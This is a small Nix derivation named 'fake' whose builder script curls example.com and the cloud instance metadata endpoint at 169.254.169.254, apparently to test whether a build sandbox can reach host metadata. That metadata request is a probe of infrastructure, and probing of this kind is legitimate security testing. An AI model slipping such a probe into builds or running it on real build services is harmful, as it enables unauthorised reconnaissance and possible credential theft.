{ pkgs, ...
}:

let file = 
  builtins.toFile "builder.sh" ''
    echo hello world
    $curl/bin/curl -L -v https://example.com
    $curl/bin/curl -L -v http://169.254.169.254/latest/meta-data/instance-id
    exit 2
  '';
in
derivation {
  name = "fake";
  system = "x86_64-linux";
  curl = pkgs.curl;
  builder = "/bin/sh";
  args = ["${file}" ];
  outputHashMode = "flat";
  outputHashAlgo = "sha256";
  outputHash = "sha256-RFjY3nhJ30TMqxXhaxVIsoUiTbul8I+sBwwcDgvMTPo=";


  meta = {
    outPath = "asdf";
  };
}
